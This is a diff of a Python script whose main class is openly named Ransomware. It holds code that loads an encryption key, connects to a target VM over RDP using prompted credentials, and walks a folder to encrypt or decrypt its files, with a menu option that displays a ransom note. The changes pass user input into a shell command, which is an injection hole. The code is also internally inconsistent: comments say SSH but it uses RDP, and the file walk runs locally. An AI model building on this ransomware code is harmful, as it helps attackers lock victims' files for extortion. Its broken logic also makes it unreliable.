@@ -1,5 +1,3 @@
-# Sierra Maldonado
-#!/usr/bin/env python3
 import os
 import subprocess
 
@@ -12,9 +10,6 @@ def write_key():
 def load_key():
     return open("key.key", "rb").read()
 
-
-
-
 class Ransomware:
     def __init__(self):
         self.sysRoot = os.path.expanduser('~')
@@ -25,7 +20,9 @@ class Ransomware:
     # Encrypt all files in a folder on a different VM using SSH
     def encrypt_folder_on_vm(self, target_vm_ip, folder_path):
         # Establish RDP connection
-        rdp_command = f"rdesktop -u your_username -p your_password {target_vm_ip}"
+        username = input("Username: ")
+        password = input("Password: ")
+        rdp_command = f"rdesktop -u {username} -p {password} {target_vm_ip}"
         subprocess.run(rdp_command, shell=True)
 
         for root, dirs, files in os.walk(folder_path):
@@ -43,7 +40,9 @@ class Ransomware:
     # Decrypt files using the Fernet symmetric key
     def decrypt_folder_on_vm(self, target_vm_ip, folder_path):
         # Establish RDP connection
-        rdp_command = f"rdesktop -u your_username -p your_password {target_vm_ip}"
+        username = input("Username: ")
+        password = input("Password: ")
+        rdp_command = f"rdesktop -u {username} -p {password} {target_vm_ip}"
         subprocess.run(rdp_command, shell=True)
 
         for root, dirs, files in os.walk(folder_path):
@@ -92,3 +91,4 @@ elif choice == "3":
     print("Ransom note displayed.")
 else:
     print("Invalid choice. Please choose a valid option.")
+
